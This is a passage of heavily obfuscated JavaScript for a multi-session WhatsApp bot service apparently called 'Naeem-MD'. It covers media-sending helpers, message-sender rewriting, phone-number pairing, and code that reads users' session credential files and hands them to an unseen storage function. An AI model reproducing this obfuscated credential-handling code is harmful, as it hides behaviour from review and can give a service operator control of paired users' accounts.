              {
                ["video"]: await EDTp(sykgc),
                ["caption"]: Mtbgc,
                ["mimetype"]: "video/mp4",
                ...oPRgc,
              },
              { ["quoted"]: ovegc, ...oPRgc },
            );
          }
          break;
      }
    var Ebqhc = 0;
    while (Ebqhc < 65535)
      switch (Ebqhc) {
        case 0x75bcd15 - 0o726746425:
          Ebqhc =
            QQUgc["split"]("/")[0x75bcd15 - 0o726746425] === "audio"
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Ebqhc = 65535;
          {
            return Iyjic["sendMessage"](
              Qwhgc,
              {
                ["audio"]: await EDTp(sykgc),
                ["caption"]: Mtbgc,
                ["mimetype"]: "audio/mpeg",
                ...oPRgc,
              },
              { ["quoted"]: ovegc, ...oPRgc },
            );
          }
          break;
      }
  };
  Iyjic["cMod"] = (
    gdthc,
    AYjhc,
    canhc = "",
    wVdhc = Iyjic["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425] +
      "@s.whatsapp.net",
    YWghc = {},
  ) => {
    let sSXgc = Object["keys"](AYjhc["message"])[0x75bcd15 - 0o726746425];
    let UTahc = sSXgc === "ephemeralMessage";
    var UnOhc = 0;
    while (UnOhc < 65535)
      switch (UnOhc) {
        case 0x75bcd15 - 0o726746425:
          UnOhc = UTahc ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          UnOhc = 65535;
          {
            sSXgc = Object["keys"](
              AYjhc["message"]["ephemeralMessage"]["message"],
            )[0x75bcd15 - 0o726746425];
          }
          break;
      }
    let wpRhc = UTahc
      ? AYjhc["message"]["ephemeralMessage"]["message"]
      : AYjhc["message"];
    let QkIhc = wpRhc[sSXgc];
    var smLhc = 0;
    while (smLhc < 65535)
      switch (smLhc) {
        case 0x75bcd15 - 0o726746425:
          smLhc = typeof QkIhc === "string" ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          smLhc = 65535;
          wpRhc[sSXgc] = canhc || QkIhc;
          break;
        case 15658734 ^ 0o73567354:
          smLhc = 65535;
          var MhChc = 0;
          while (MhChc < 65535)
            switch (MhChc) {
              case 0x75bcd15 - 0o726746425:
                MhChc = QkIhc["caption"] ? 1 : 2;
                break;
              case 0o57060516 - 0xbc614d:
                MhChc = 65535;
                QkIhc["caption"] = canhc || QkIhc["caption"];
                break;
              case 15658734 ^ 0o73567354:
                MhChc = 65535;
                var ojFhc = 0;
                while (ojFhc < 65535)
                  switch (ojFhc) {
                    case 0x75bcd15 - 0o726746425:
                      ojFhc = QkIhc["text"] ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      ojFhc = 65535;
                      QkIhc["text"] = canhc || QkIhc["text"];
                      break;
                  }
                break;
            }
          break;
      }
    var Iewhc = 0;
    while (Iewhc < 65535)
      switch (Iewhc) {
        case 0x75bcd15 - 0o726746425:
          Iewhc = typeof QkIhc !== "string" ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Iewhc = 65535;
          wpRhc[sSXgc] = { ...QkIhc, ...YWghc };
          break;
      }
    var kgzhc = 0;
    while (kgzhc < 65535)
      switch (kgzhc) {
        case 0x75bcd15 - 0o726746425:
          kgzhc = AYjhc["key"]["participant"] ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          kgzhc = 65535;
          wVdhc = AYjhc["key"]["participant"] =
            wVdhc || AYjhc["key"]["participant"];
          break;
        case 15658734 ^ 0o73567354:
          kgzhc = 65535;
          var MFAec = 0;
          while (MFAec < 65535)
            switch (MFAec) {
              case 0x75bcd15 - 0o726746425:
                MFAec = AYjhc["key"]["participant"] ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                MFAec = 65535;
                wVdhc = AYjhc["key"]["participant"] =
                  wVdhc || AYjhc["key"]["participant"];
                break;
            }
          break;
      }
    var oHDec = 0;
    while (oHDec < 65535)
      switch (oHDec) {
        case 0x75bcd15 - 0o726746425:
          oHDec = AYjhc["key"]["remoteJid"]["includes"]("@s.whatsapp.net")
            ? 1
            : 2;
          break;
        case 0o57060516 - 0xbc614d:
          oHDec = 65535;
          wVdhc = wVdhc || AYjhc["key"]["remoteJid"];
          break;
        case 15658734 ^ 0o73567354:
          oHDec = 65535;
          var ICuec = 0;
          while (ICuec < 65535)
            switch (ICuec) {
              case 0x75bcd15 - 0o726746425:
                ICuec = AYjhc["key"]["remoteJid"]["includes"]("@broadcast")
                  ? 1
                  : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                ICuec = 65535;
                wVdhc = wVdhc || AYjhc["key"]["remoteJid"];
                break;
            }
          break;
      }
    AYjhc["key"]["remoteJid"] = gdthc;
    AYjhc["key"]["fromMe"] =
      wVdhc ===
      Iyjic["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425] +
        "@s.whatsapp.net";
    return kQqs["WebMessageInfo"]["fromObject"](AYjhc);
  };
  Iyjic["getFile"] = async (kExec, Ezoec) => {
    let gBrec;
    let Awiec = Buffer["isBuffer"](kExec)
      ? kExec
      : /^data:.*?\/.*?;base64,/i["test"](kExec)
        ? Buffer["from"](
            kExec["split"]`${","}`[0o57060516 - 0xbc614d],
            "base64",
          )
        : /^https?:\/\//["test"](kExec)
          ? await (gBrec = await EDTp(kExec))
          : ULgu["existsSync"](kExec)
            ? ((cSYec = kExec), ULgu["readFileSync"](kExec))
            : typeof kExec === "string"
              ? kExec
              : Buffer["alloc"](0x75bcd15 - 0o726746425);
    let cylec = (await AIbs["fromBuffer"](Awiec)) || {
      ["mime"]: "application/octet-stream",
      ["ext"]: ".bin",
    };
    let cSYec = Ymlr["join"](
      __dirname,
      new Date() * (0o57060516 - 0xbc614d) + "." + cylec["ext"],
    );
    var ETbfc = 0;
    while (ETbfc < 65535)
      switch (ETbfc) {
        case 0x75bcd15 - 0o726746425:
          ETbfc = Awiec && Ezoec ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          ETbfc = 65535;
          ULgu["promises"]["writeFile"](cSYec, Awiec);
          break;
      }
    return {
      ["res"]: gBrec,
      ["filename"]: cSYec,
      ["size"]: await koVZb(Awiec),
      ...cylec,
      ["data"]: Awiec,
    };
  };
  Iyjic["sendFile"] = async (YOSec, AQVec, ULMec, wNPec = {}, QIGec = {}) => {
    let sKJec = await Iyjic["getFile"](AQVec, !![]);
    let {
      ["filename"]: sexfc,
      ["size"]: UfAfc,
      ["ext"]: obrfc,
      ["mime"]: Qcufc,
      ["data"]: kYkfc,
    } = sKJec;
    let MZnfc = "",
      gVefc = Qcufc,
      IWhfc = sexfc;
    var IqVfc = 0;
    while (IqVfc < 65535)
      switch (IqVfc) {
        case 0x75bcd15 - 0o726746425:
          IqVfc = QIGec["asDocument"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          IqVfc = 65535;
          MZnfc = "document";
          break;
      }
    var ksYfc = 0;
    while (ksYfc < 65535)
      switch (ksYfc) {
        case 0x75bcd15 - 0o726746425:
          ksYfc = QIGec["asSticker"] || /webp/["test"](Qcufc) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          ksYfc = 65535;
          {
            let { ["writeExif"]: EnPfc } = require("./exif.js");
            let gpSfc = { ["mimetype"]: Qcufc, ["data"]: kYkfc };
            IWhfc = await EnPfc(gpSfc, {
              ["packname"]: QEXn["packname"],
              ["author"]: QEXn["packname"],
              ["categories"]: QIGec["categories"] ? QIGec["categories"] : [],
            });
            await ULgu["promises"]["unlink"](sexfc);
            MZnfc = "sticker";
            gVefc = "image/webp";
          }
          break;
        case 15658734 ^ 0o73567354:
          ksYfc = 65535;
          var AkJfc = 0;
          while (AkJfc < 65535)
            switch (AkJfc) {
              case 0x75bcd15 - 0o726746425:
                AkJfc = /image/["test"](Qcufc) ? 1 : 2;
                break;
              case 0o57060516 - 0xbc614d:
                AkJfc = 65535;
                MZnfc = "image";
                break;
              case 15658734 ^ 0o73567354:
                AkJfc = 65535;
                var cmMfc = 0;
                while (cmMfc < 65535)
                  switch (cmMfc) {
                    case 0x75bcd15 - 0o726746425:
                      cmMfc = /video/["test"](Qcufc) ? 1 : 2;
                      break;
                    case 0o57060516 - 0xbc614d:
                      cmMfc = 65535;
                      MZnfc = "video";
                      break;
                    case 15658734 ^ 0o73567354:
                      cmMfc = 65535;
                      var whDfc = 0;
                      while (whDfc < 65535)
                        switch (whDfc) {
                          case 0x75bcd15 - 0o726746425:
                            whDfc = /audio/["test"](Qcufc) ? 1 : 2;
                            break;
                          case 0o57060516 - 0xbc614d:
                            whDfc = 65535;
                            MZnfc = "audio";
                            break;
                          case 15658734 ^ 0o73567354:
                            whDfc = 65535;
                            MZnfc = "document";
                            break;
                        }
                      break;
                  }
                break;
            }
          break;
      }
    await Iyjic["sendMessage"](
      YOSec,
      {
        [MZnfc]: { ["url"]: IWhfc },
        ["mimetype"]: gVefc,
        ["fileName"]: ULMec,
        ...QIGec,
      },
      { ["quoted"]: wNPec, ...QIGec },
    );
    return ULgu["promises"]["unlink"](IWhfc);
  };
  Iyjic["parseMention"] = async (YiGfc) => {
    return [...YiGfc["matchAll"](/@([0-9]{5,16}|0)/g)]["map"](
      (AIHcc) => AIHcc[0o57060516 - 0xbc614d] + "@s.whatsapp.net",
    );
  };
  Iyjic["sendMedia"] = async (
    cKKcc,
    wFBcc,
    YGEcc = "",
    sCvcc = "",
    UDycc = "",
    ozpcc = {},
  ) => {
    let QAscc = await Iyjic["getFile"](wFBcc, !![]);
    let {
      ["mime"]: QUfdc,
      ["ext"]: sWidc,
      ["res"]: MRZcc,
      ["data"]: oTcdc,
      ["filename"]: IOTcc,
    } = QAscc;
    var kQWcc = 0;
    while (kQWcc < 65535)
      switch (kQWcc) {
        case 0x75bcd15 - 0o726746425:
          kQWcc =
            (MRZcc && MRZcc["status"] !== 200) || file["length"] <= 65536
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          kQWcc = 65535;
          {
            try {
              throw { ["json"]: JSON["parse"](file["toString"]()) };
            } catch (ELNcc) {
              var gNQcc = 0;
              while (gNQcc < 65535)
                switch (gNQcc) {
                  case 0x75bcd15 - 0o726746425:
                    gNQcc = ELNcc["json"] ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    gNQcc = 65535;
                    throw ELNcc["json"];
                }
            }
          }
          break;
      }
    let ghEdc = "",
      IiHdc = QUfdc,
      ceydc = IOTcc;
    var EfBdc = 0;
    while (EfBdc < 65535)
      switch (EfBdc) {
        case 0x75bcd15 - 0o726746425:
          EfBdc = ozpcc["asDocument"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          EfBdc = 65535;
          ghEdc = "document";
          break;
      }
    var Yasdc = 0;
    while (Yasdc < 65535)
      switch (Yasdc) {
        case 0x75bcd15 - 0o726746425:
          Yasdc = ozpcc["asSticker"] || /webp/["test"](QUfdc) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          Yasdc = 65535;
          {
            let { ["writeExif"]: Acvdc } = require("./exif");
            let UXldc = { ["mimetype"]: QUfdc, ["data"]: oTcdc };
            ceydc = await Acvdc(UXldc, {
              ["packname"]: ozpcc["packname"]
                ? ozpcc["packname"]
                : QEXn["packname"],
              ["author"]: ozpcc["author"] ? ozpcc["author"] : QEXn["author"],
              ["categories"]: ozpcc["categories"] ? ozpcc["categories"] : [],
            });
            await ULgu["promises"]["unlink"](IOTcc);
            ghEdc = "sticker";
            IiHdc = "image/webp";
          }
          break;
        case 15658734 ^ 0o73567354:
          Yasdc = 65535;
          var wZodc = 0;
          while (wZodc < 65535)
            switch (wZodc) {
              case 0x75bcd15 - 0o726746425:
                wZodc = /image/["test"](QUfdc) ? 1 : 2;
                break;
              case 0o57060516 - 0xbc614d:
                wZodc = 65535;
                ghEdc = "image";
                break;
              case 15658734 ^ 0o73567354:
                wZodc = 65535;
                var wtcec = 0;
                while (wtcec < 65535)
                  switch (wtcec) {
                    case 0x75bcd15 - 0o726746425:
                      wtcec = /video/["test"](QUfdc) ? 1 : 2;
                      break;
                    case 0o57060516 - 0xbc614d:
                      wtcec = 65535;
                      ghEdc = "video";
                      break;
                    case 15658734 ^ 0o73567354:
                      wtcec = 65535;
                      var Yufec = 0;
                      while (Yufec < 65535)
                        switch (Yufec) {
                          case 0x75bcd15 - 0o726746425:
                            Yufec = /audio/["test"](QUfdc) ? 1 : 2;
                            break;
                          case 0o57060516 - 0xbc614d:
                            Yufec = 65535;
                            ghEdc = "audio";
                            break;
                          case 15658734 ^ 0o73567354:
                            Yufec = 65535;
                            ghEdc = "document";
                            break;
                        }
                      break;
                  }
                break;
            }
          break;
      }
    await Iyjic["sendMessage"](
      cKKcc,
      {
        [ghEdc]: { ["url"]: ceydc },
        ["caption"]: sCvcc,
        ["mimetype"]: IiHdc,
        ["fileName"]: YGEcc,
        ...ozpcc,
      },
      { ["quoted"]: UDycc, ...ozpcc },
    );
    return ULgu["promises"]["unlink"](ceydc);
  };
  Iyjic["sendVideoAsSticker"] = async (sqWdc, UrZdc, onQdc = {}) => {
    let QoTdc;
    var kkKdc = 0;
    while (kkKdc < 65535)
      switch (kkKdc) {
        case 0x75bcd15 - 0o726746425:
          kkKdc = onQdc && (onQdc["packname"] || onQdc["author"]) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          kkKdc = 65535;
          {
            QoTdc = await writeExifVid(UrZdc, onQdc);
          }
          break;
        case 15658734 ^ 0o73567354:
          kkKdc = 65535;
          {
            QoTdc = await videoToWebp(UrZdc);
          }
          break;
      }
    await Iyjic["sendMessage"](
      sqWdc,
      { ["sticker"]: { ["url"]: QoTdc }, ...onQdc },
      onQdc,
    );
  };
  Iyjic["sendImageAsSticker"] = async (MlNdc, oLOac, QMRac = {}) => {
    let kIIac;
    var MJLac = 0;
    while (MJLac < 65535)
      switch (MJLac) {
        case 0x75bcd15 - 0o726746425:
          MJLac = QMRac && (QMRac["packname"] || QMRac["author"]) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          MJLac = 65535;
          {
            kIIac = await writeExifImg(oLOac, QMRac);
          }
          break;
        case 15658734 ^ 0o73567354:
          MJLac = 65535;
          {
            kIIac = await imageToWebp(oLOac);
          }
          break;
      }
    await Iyjic["sendMessage"](
      MlNdc,
      { ["sticker"]: { ["url"]: kIIac }, ...QMRac },
      QMRac,
    );
  };
  Iyjic["sendTextWithMentions"] = async (gFCac, IGFac, cCwac, EDzac = {}) =>
    Iyjic["sendMessage"](
      gFCac,
      {
        ["text"]: IGFac,
        ["contextInfo"]: {
          ["mentionedJid"]: [...IGFac["matchAll"](/@(\d{0,16})/g)]["map"](
            (EXmbc) => EXmbc[0o57060516 - 0xbc614d] + "@s.whatsapp.net",
          ),
        },
        ...EDzac,
      },
      { ["quoted"]: cCwac },
    );
  Iyjic["sendImage"] = async (gZpbc, AUgbc, cWjbc = "", wRabc = "", YSdbc) => {
    let sOUac = Buffer["isBuffer"](AUgbc)
      ? AUgbc
      : /^data:.*?\/.*?;base64,/i["test"](AUgbc)
        ? Buffer["from"](
            AUgbc["split"]`${","}`[0o57060516 - 0xbc614d],
            "base64",
          )
        : /^https?:\/\//["test"](AUgbc)
          ? await await EDTp(AUgbc)
          : ULgu["existsSync"](AUgbc)
            ? ULgu["readFileSync"](AUgbc)
            : Buffer["alloc"](0x75bcd15 - 0o726746425);
    return await Iyjic["sendMessage"](
      gZpbc,
      { ["image"]: sOUac, ["caption"]: cWjbc, ...YSdbc },
      { ["quoted"]: wRabc },
    );
  };
  Iyjic["sendText"] = (UPXac, UjLbc, wlObc = "", QgFbc) =>
    Iyjic["sendMessage"](
      UPXac,
      { ["text"]: UjLbc, ...QgFbc },
      { ["quoted"]: wlObc },
    );
  Iyjic["sendButtonText"] = (
    siIbc,
    Mdzbc = [],
    ofCbc,
    Iatbc,
    kcwbc = "",
    kwjcc = {},
  ) => {
    let Mxmcc = {
      ["text"]: ofCbc,
      ["footer"]: Iatbc,
      ["buttons"]: Mdzbc,
      ["headerType"]: 2,
      ...kwjcc,
    };
    Iyjic["sendMessage"](siIbc, Mxmcc, { ["quoted"]: kcwbc, ...kwjcc });
  };
  Iyjic["send5ButImg"] = async (
    gtdcc,
    Iugcc = "",
    cqXbc = "",
    Eracc,
    YmRbc = [],
    AoUbc,
    cOVYb = {},
  ) => {
    let EPYYb = await kopp(
      { ["image"]: Eracc, ["jpegThumbnail"]: AoUbc },
      { ["upload"]: Iyjic["waUploadToServer"] },
    );
    var YKPYb = cidp(
      gtdcc,
      kQqs["Message"]["fromObject"]({
        ["templateMessage"]: {
          ["hydratedTemplate"]: {
            ["imageMessage"]: EPYYb["imageMessage"],
            ["hydratedContentText"]: Iugcc,
            ["hydratedFooterText"]: cqXbc,
            ["hydratedButtons"]: YmRbc,
          },
        },
      }),
      cOVYb,
    );
    Iyjic["relayMessage"](gtdcc, YKPYb["message"], {
      ["messageId"]: YKPYb["key"]["id"],
    });
  };
  Iyjic["getName"] = (AMSYb, UHJYb = NaN === NaN) => {
    id = Iyjic["decodeJid"](AMSYb);
    UHJYb = Iyjic["withoutContact"] || UHJYb;
    let wJMYb;
    var QEDYb = 0;
    while (QEDYb < 65535)
      switch (QEDYb) {
        case 0x75bcd15 - 0o726746425:
          QEDYb = id["endsWith"]("@g.us") ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          QEDYb = 65535;
          return new Promise(async (sGGYb) => {
            wJMYb = store["contacts"][id] || {};
            var sauZb = 0;
            while (sauZb < 65535)
              switch (sauZb) {
                case 0x75bcd15 - 0o726746425:
                  sauZb = !(wJMYb["name"]["notify"] || wJMYb["subject"])
                    ? 1
                    : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  sauZb = 65535;
                  wJMYb = Iyjic["groupMetadata"](id) || {};
                  break;
              }
            sGGYb(
              wJMYb["name"] ||
                wJMYb["subject"] ||
                PhoneNumber("+" + id["replace"]("@s.whatsapp.net", ""))[
                  "getNumber"
                ]("international"),
            );
          });
        case 15658734 ^ 0o73567354:
          QEDYb = 65535;
          wJMYb =
            id === "0@s.whatsapp.net"
              ? { ["id"]: id, ["name"]: "WhatsApp" }
              : id ===
                  Iyjic["decodeJid"](
                    Iyjic["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425] +
                      "@s.whatsapp.net",
                  )
                ? Iyjic["user"]
                : store["contacts"][id] || {};
          break;
      }
    return (
      (UHJYb ? "" : wJMYb["name"]) ||
      wJMYb["subject"] ||
      wJMYb["verifiedName"] ||
      PhoneNumber("+" + AMSYb["replace"]("@s.whatsapp.net", ""))["getNumber"](
        "international",
      )
    );
  };
  Iyjic["sendContact"] = async (UbxZb, oXnZb, QYqZb = "", kUhZb = {}) => {
    let MVkZb = [];
    for (let gRbZb of oXnZb) {
      MVkZb["push"]({
        ["displayName"]: await Iyjic["getName"](gRbZb + "@s.whatsapp.net"),
        ["vcard"]: `${"BEGIN:VCARD\\nVERSION:3.0\\nN:"}${await Iyjic["getName"](gRbZb + "@s.whatsapp.net")}${"\\nFN:"}${global["OwnerName"]}${"\\nitem1.TEL;waid="}${gRbZb}${":"}${gRbZb}${"\\nitem1.X-ABLabel:Click here to chat\\nitem2.EMAIL;type=INTERNET:"}${global["email"]}${"\\nitem2.X-ABLabel:GitHub\\nitem3.URL:https://github.com/"}${global["github"]}${"/khan-xd\\nitem3.X-ABLabel:GitHub\\nitem4.ADR:;;"}${global["location"]}${";;;;\\nitem4.X-ABLabel:Region\\nEND:VCARD"}`,
      });
    }
    Iyjic["sendMessage"](
      UbxZb,
      {
        ["contacts"]: {
          ["displayName"]: `${MVkZb["length"]}${" Contact"}`,
          ["contacts"]: MVkZb,
        },
        ...kUhZb,
      },
      { ["quoted"]: QYqZb },
    );
  };
  Iyjic["setStatus"] = (ISeZb) => {
    Iyjic["query"]({
      ["tag"]: "iq",
      ["attrs"]: {
        ["to"]: "@s.whatsapp.net",
        ["type"]: "set",
        ["xmlns"]: "status",
      },
      ["content"]: [
        {
          ["tag"]: "status",
          ["attrs"]: {},
          ["content"]: Buffer["from"](ISeZb, "utf-8"),
        },
      ],
    });
    return ISeZb;
  };
  Iyjic["serializeM"] = (ImSZb) => cCQp(Iyjic, ImSZb);
}
async function koVZb(EjMZb) {
  return EjMZb["length"];
}
async function glPZb(AgGZb, ciJZb) {
  const wdAZb = AgGZb["replace"](/[^0-9]/g, "");
  var YeDZb = 0;
  while (YeDZb < 65535)
    switch (YeDZb) {
      case 0x75bcd15 - 0o726746425:
        YeDZb = UrBj["has"](wdAZb) ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        YeDZb = 65535;
        {
          var Yyqac = 0;
          while (Yyqac < 65535)
            switch (Yyqac) {
              case 0x75bcd15 - 0o726746425:
                Yyqac = ciJZb && !ciJZb["headersSent"] ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                Yyqac = 65535;
                {
                  return ciJZb["status"](200)["send"]({
                    ["status"]: "already_connected",
                    ["message"]: "This number is already connected",
                  });
                }
                break;
            }
          return UrBj["get"](wdAZb);
        }
        break;
    }
  var AAtac = 0;
  while (AAtac < 65535)
    switch (AAtac) {
      case 0x75bcd15 - 0o726746425:
        AAtac = !wRCg() ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        AAtac = 65535;
        {
          var Uvkac = 0;
          while (Uvkac < 65535)
            switch (Uvkac) {
              case 0x75bcd15 - 0o726746425:
                Uvkac = ciJZb && !ciJZb["headersSent"] ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                Uvkac = 65535;
                {
                  return ciJZb["status"](429)["send"]({
                    ["error"]: "Maximum sessions limit reached",
                    ["message"]: `${"Maximum "}${sKlk}${" active sessions allowed."}`,
                  });
                }
                break;
            }
          return null;
        }
        break;
    }
  const wxnac = Ymlr["join"](Qovj, `${"session_"}${wdAZb}`);
  const Qseac = await wNrk(wdAZb);
  var suhac = 0;
  while (suhac < 65535)
    switch (suhac) {
      case 0x75bcd15 - 0o726746425:
        suhac = Qseac ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        suhac = 65535;
        {
          ULgu["ensureDirSync"](wxnac);
          ULgu["writeFileSync"](
            Ymlr["join"](wxnac, "creds.json"),
            JSON["stringify"](Qseac, null, 15658734 ^ 0o73567354),
          );
        }
        break;
    }
  const { ["state"]: MpYZb, ["saveCreds"]: orbac } = await wFVr(wxnac);
  const { ["version"]: QQcXb } = await YeXo();
  try {
    const sSfXb = UDSr({
      ["auth"]: {
        ["creds"]: MpYZb["creds"],
        ["keys"]: UXFs(
          MpYZb["keys"],
          MxGr({ ["level"]: "fatal" })["child"]({ ["level"]: "fatal" }),
        ),
      },
      ["printQRInTerminal"]: NaN === NaN,
      ["logger"]: MxGr({ ["level"]: "fatal" })["child"]({ ["level"]: "fatal" }),
      ["syncFullHistory"]: NaN === NaN,
      ["browser"]: Agap["windows"]("Chrome"),
      ["version"]: QQcXb,
    });
    await gxgic(sSfXb);
    onsj["set"](wdAZb, Date["now"]());
    let MNWWb;
    try {
      MNWWb = await ceaj(wdAZb);
      MNWWb = { ...QEXn["DEFAULT_SETTINGS"], ...MNWWb };
    } catch (oPZWb) {
      MNWWb = { ...QEXn["DEFAULT_SETTINGS"] };
    }
    sSfXb["userConfig"] = MNWWb;
    Unyd(sSfXb, wdAZb, MNWWb);
    cOxe(sSfXb, MNWWb);
    IKsc(sSfXb);
    ofeh(sSfXb, MNWWb);
    sSfXb["ev"]["on"]("group-participants.update", (IKQWb) =>
      oDUn(sSfXb, IKQWb),
    );
    const kMTWb = async () => {
      try {
        await orbac();
        await sCPr(500);
        const EHKWb = Ymlr["join"](wxnac, "creds.json");
        var gJNWb = 0;
        while (gJNWb < 65535)
          switch (gJNWb) {
            case 0x75bcd15 - 0o726746425:
              gJNWb = wlir["existsSync"](EHKWb) ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              gJNWb = 65535;
              {
                const gdBXb = await ULgu["readFile"](EHKWb, "utf8");
                var IeEXb = 0;
                while (IeEXb < 65535)
                  switch (IeEXb) {
                    case 0x75bcd15 - 0o726746425:
                      IeEXb =
                        gdBXb &&
                        gdBXb["trim"]()["length"] > 0x75bcd15 - 0o726746425
                          ? 1
                          : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      IeEXb = 65535;
                      {
                        try {
                          const cavXb = JSON["parse"](gdBXb);
                          await gVGk(wdAZb, cavXb);
                        } catch (EbyXb) {}
                      }
                      break;
                  }
              }
              break;
          }
      } catch (YWoXb) {}
    };
    sSfXb["ev"]["on"]("creds.update", kMTWb);
    sSfXb["ev"]["on"]("connection.update", async (AYrXb) => {
      const { ["connection"]: UTiXb, ["lastDisconnect"]: wVlXb } = AYrXb;
      var wpZXb = 0;
      while (wpZXb < 65535)
        switch (wpZXb) {
          case 0x75bcd15 - 0o726746425:
            wpZXb = UTiXb === "open" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            wpZXb = 65535;
            {
              try {
                await sCPr(3000);
                try {
                  await UTKc(sSfXb);
                } catch (YqcYb) {}
                try {
                  await AAVf(wdAZb, MNWWb);
                  await cqzh(wdAZb);
                  UrBj["set"](wdAZb, sSfXb);
                  const smTXb = `${"\ud83e *Naeem-MD Aᴄᴛɪᴠᴀᴛᴇᴅ*\\n\\n- Type .menu for commands\\n\\n> *POWERED BY NAEEM TECH*"}`;
                  try {
                    await sSfXb["sendMessage"](
                      sSfXb["user"]["id"]["split"](":")[
                        0x75bcd15 - 0o726746425
                      ] + "@s.whatsapp.net",
                      {
                        ["image"]: { ["url"]: QEXn["IK_IMAGE_PATH"] },
                        ["caption"]: smTXb,
                      },
                      {
                        ["disappearingMessagesInChat"]: !![],
                        ["ephemeralExpiration"]: 100,
                      },
                    );
                  } catch (UnWXb) {
                    await sSfXb["sendMessage"](
                      sSfXb["user"]["id"]["split"](":")[
                        0x75bcd15 - 0o726746425
                      ] + "@s.whatsapp.net",
                      { ["text"]: smTXb },
                      {
                        ["disappearingMessagesInChat"]: !![],
                        ["ephemeralExpiration"]: 100,
                      },
                    );
                  }
                } catch (ojNXb) {}
              } catch (QkQXb) {
                sicr(
                  `${"pm2 restart "}${process["env"]["PM2_NAME"] || "session"}`,
                );
              }
            }
            break;
        }
      var kgHXb = 0;
      while (kgHXb < 65535)
        switch (kgHXb) {
          case 0x75bcd15 - 0o726746425:
            kgHXb = UTiXb === "close" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            kgHXb = 65535;
            {
              const MhKXb = wVlXb?.["error"]?.["output"]?.["statusCode"];
              const MBxYb = wVlXb?.["error"]?.["message"] || "Unknown error";
              var oDAYb = 0;
              while (oDAYb < 65535)
                switch (oDAYb) {
                  case 0x75bcd15 - 0o726746425:
                    oDAYb =
                      MhKXb === 401 || MhKXb === 403 || MhKXb === 404 ? 1 : 2;
                    break;
                  case 0o57060516 - 0xbc614d:
                    oDAYb = 65535;
                    {
                      sSfXb["ev"]["off"]("creds.update", kMTWb);
                      await kIkg(wdAZb, sSfXb, MBxYb);
                    }
                    break;
                  case 15658734 ^ 0o73567354:
                    oDAYb = 65535;
                    var IyrYb = 0;
                    while (IyrYb < 65535)
                      switch (IyrYb) {
                        case 0x75bcd15 - 0o726746425:
                          IyrYb = MhKXb !== 408 ? 1 : 65535;
                          break;
                        case 0o57060516 - 0xbc614d:
                          IyrYb = 65535;
                          {
                            await sCPr(10000);
                            UrBj["delete"](wdAZb);
                            onsj["delete"](wdAZb);
                            const kAuYb = {
                              ["headersSent"]: NaN === NaN,
                              ["send"]: () => {},
                              ["status"]: () => kAuYb,
                            };
                            await glPZb(AgGZb, kAuYb);
                          }
                          break;
                      }
                    break;
                }
            }
            break;
        }
    });
    var EvlYb = 0;
    while (EvlYb < 65535)
      switch (EvlYb) {
        case 0x75bcd15 - 0o726746425:
          EvlYb = !sSfXb["authState"]["creds"]["registered"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          EvlYb = 65535;
          {
            let gxoYb = QEXn["MAX_RETRIES"];
            let AsfYb;
            while (gxoYb > 0x75bcd15 - 0o726746425) {
              try {
                await sCPr(1500);
                AsfYb = await sSfXb["requestPairingCode"](wdAZb);
                break;
              } catch (cuiYb) {
                gxoYb--;
                var ETjVb = 0;
                while (ETjVb < 65535)
                  switch (ETjVb) {
                    case 0x75bcd15 - 0o726746425:
                      ETjVb = gxoYb === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      ETjVb = 65535;
                      throw cuiYb;
                  }
                await sCPr(2000 * (QEXn["MAX_RETRIES"] - gxoYb));
              }
            }
            var gVmVb = 0;
            while (gVmVb < 65535)
              switch (gVmVb) {
                case 0x75bcd15 - 0o726746425:
                  gVmVb = ciJZb && !ciJZb["headersSent"] ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  gVmVb = 65535;
                  {
                    return ciJZb["send"]({ ["code"]: AsfYb });
                  }
                  break;
              }
          }
          break;
      }
    return sSfXb;
  } catch (AQdVb) {
    onsj["delete"](wdAZb);
    var cSgVb = 0;
    while (cSgVb < 65535)
      switch (cSgVb) {
        case 0x75bcd15 - 0o726746425:
          cSgVb = ciJZb && !ciJZb["headersSent"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          cSgVb = 65535;
          {
            ciJZb["status"](503)["send"]({
              ["error"]: "Service Unavailable",
              ["message"]: "Failed to pair. Please try again.",
            });
          }
          break;
      }
    throw AQdVb;
  }
}
async function wNXUb() {
  try {
    const YOaVb = await cKmi();
    var sKRUb = 0;
    while (sKRUb < 65535)
      switch (sKRUb) {
        case 0x75bcd15 - 0o726746425:
          sKRUb = !Array["isArray"](YOaVb) ? 1 : 65535;
          break;
